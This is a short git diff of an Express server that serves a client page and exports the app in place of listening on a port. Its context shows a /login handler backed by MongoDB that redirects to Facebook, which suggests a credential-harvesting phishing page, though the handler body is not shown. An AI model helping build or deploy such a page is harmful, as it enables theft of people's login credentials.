@@ -9,7 +9,7 @@ app.use(express.static(resolve('client')));
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 
-app.get('/', (req, res) => res.sendFile());
+app.get('/', (req, res) => res.sendFile(resolve('client', 'index.html')));
 
 const uri = process.env.MONGODB_URI;
 const client = new MongoClient(uri);
@@ -32,6 +32,4 @@ app.post('/login', async (req, res) => {
 	res.redirect('https://web.facebook.com/?_rdc=1&_rdr');
 });
 
-app.listen(PORT, () => {
-	console.log(`App is listening on PORT: ${PORT}`);
-});
+module.exports = app;
